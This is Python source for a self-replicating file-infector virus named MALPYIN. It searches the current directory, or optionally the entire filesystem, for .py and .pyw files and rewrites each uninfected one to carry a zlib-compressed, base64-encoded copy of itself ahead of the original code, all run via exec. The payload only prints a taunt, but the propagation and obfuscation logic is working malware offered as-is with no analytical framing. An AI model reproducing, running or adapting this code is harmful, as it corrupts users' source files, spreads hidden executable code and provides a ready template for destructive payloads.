# MALPYIN

# do we want to infect the entire filesystem?
GLOBAL = False

import os
import sys
from pathlib import Path
import re
import base64
import zlib

def packer(vsrc, osrc):
    """
    Really simple packer that gzip the virus source and original src
    and finally, base64 encode them.
    """
    vcomp = base64.b64encode(zlib.compress(vsrc.encode('utf-8'))).decode('utf-8')
    ocomp = base64.b64encode(zlib.compress(osrc.encode('utf-8'))).decode('utf-8')
    return f'# MALPYIN\n\nimport zlib,base64;\nexec(zlib.decompress(base64.b64decode("{vcomp}")));\n# MALPYOUT\n\nexec(zlib.decompress(base64.b64decode("{ocomp}")))'


malcode = []
with open(sys.argv[0], 'r') as f:
    lines = f.readlines()

found_malcode = False
for line in lines:
    if found_malcode:
        malcode.append(line)
    if line == "# MALPYIN\n":
        found_malcode = True
        continue
    if line == "# MALPYOUT\n":
        break

if re.search(r'^exec\(\)', str(malcode)):
    print("found secondary infection")
    malcode_full = re.search(r'^exec.+\{(.*)\}',str(malcode))
    icode = zlib.decompress(base64.b64decode(malcode_full.group()))
    malcode.append(str(icode) +'\n')

if GLOBAL==True:
    fs_root = os.path.abspath('.').split(os.path.sep)[0]+os.path.sep
else:
    fs_root = '.'

files = (p.resolve() for p in Path(fs_root).glob("**/*") if p.suffix in {".py", ".pyw"})

for file in files:
    with open(file, 'r') as f:
        org = f.readlines()

    infected = False

    for line in org:
        if line == "# MALPYIN\n":
            infected = True
            break

    if not infected:
        with open(file, 'w') as f:
            f.writelines(packer(''.join(malcode),''.join(org)))

def malpy():
    print("If I were EV1L I would have D3S7R0Y3D your system here")

malpy()